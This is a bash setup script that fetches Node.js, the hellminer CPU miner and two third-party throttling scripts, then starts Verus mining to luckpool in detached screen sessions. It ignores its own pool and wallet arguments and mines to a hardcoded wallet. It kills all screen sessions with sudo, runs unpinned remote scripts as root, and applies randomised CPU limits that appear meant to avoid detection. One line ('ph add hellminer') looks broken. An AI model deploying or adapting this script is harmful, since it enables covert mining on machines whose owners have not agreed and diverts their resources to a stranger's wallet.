#!/bin/bash

pool=$1
address=$2
pass=$3
min=$4
max=$5
cd ~

core=$(lscpu | egrep '^CPU\(s\):' | awk -v FS=: '{print $2}' | tr -d '[:blank:]' )
sudo killall screen || echo "cleaning process"
rm -rf hellminer || echo "starting setup"
wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
\tar xf node-v14.17.0-linux-x64.tar.gz -C /opt/
\rm node-v14.17.0-linux-x64.tar.gz
PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
npm config set cache /tmp --global
ph add hellminer
mkdir hellminer && cd hellminer
sudo apt update -y
sudo apt install unzip cpulimit -y
sudo wget -O /cpulimit-all.sh https://git.aweirdimagination.net/perelman/cpulimit-all/raw/branch/main/cpulimit-all.sh
sudo chmod +x /cpulimit-all.sh
sudo wget -O /multi-process-limit.sh https://raw.githubusercontent.com/fuzzle20/all-about-cpu-mining/main/multi-process-limit.sh
sudo chmod +x /multi-process-limit.sh
wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xf hellminer_linux64.tar.gz
screen -dmS miner ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RUf9nXasGVcz4mtWhYxENVzmQrpf1g5WXx.3 -p x --cpu $core
screen -dmS randomlimit /multi-process-limit.sh verus-solver $min $max
